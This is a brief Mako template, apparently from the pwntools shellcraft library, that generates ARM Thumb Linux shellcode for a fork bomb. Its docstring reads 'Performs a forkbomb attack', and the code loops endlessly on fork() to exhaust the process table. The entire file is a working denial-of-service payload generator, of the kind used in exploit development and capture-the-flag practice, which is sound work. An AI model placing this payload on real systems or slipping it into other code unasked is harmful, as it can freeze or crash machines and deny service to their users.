<%
    from pwnlib.shellcraft.thumb.linux import fork
    from pwnlib.shellcraft.common import label
%>
<%docstring>
Performs a forkbomb attack.
</%docstring>
<%
    dosloop = label('fork_bomb')
%>
${dosloop}:
    ${fork()}
    b ${dosloop}
